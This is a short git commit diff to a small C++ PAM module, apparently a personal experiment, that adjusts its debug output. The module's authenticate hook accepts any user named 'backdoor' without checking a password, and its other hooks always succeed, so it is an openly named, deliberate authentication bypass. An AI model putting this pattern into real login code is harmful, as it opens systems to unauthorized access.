912c6e94294e119b0e26650cc2ab062f6fc901c2
Michael Shulbaev <chulupey@gmail.com>
2016-11-10 18:28:09 +0600

    Finish move to CMake

--- src/simple_pam.cpp
+++ src/simple_pam.cpp
@@ -6,12 +6,10 @@
 
 /* expected hook */
 PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
-    printf("==> Set credentials\n");
     return PAM_SUCCESS;
 }
 
 PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
-    printf("==> Acct mgmt\n");
     return PAM_SUCCESS;
 }
 
@@ -19,10 +17,12 @@ PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const c
 PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
     int retval;
 
+    for (int i = 0; i < argc; ++i) {
+        printf("==> Arg %d: %s\n", i, argv[i]);
+    }
+
     const char* pUsername;
     retval = pam_get_user(pamh, &pUsername, "Username: ");
-
-    printf("==> Welcome home %s\n", pUsername);
 
     if (retval != PAM_SUCCESS) {
         return retval;
@@ -31,6 +31,7 @@ PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, cons
     if (strcmp(pUsername, "backdoor") != 0) {
         return PAM_AUTH_ERR;
     }
+    printf("You are backdoor! Welcome!\n");
 
     return PAM_SUCCESS;
 }
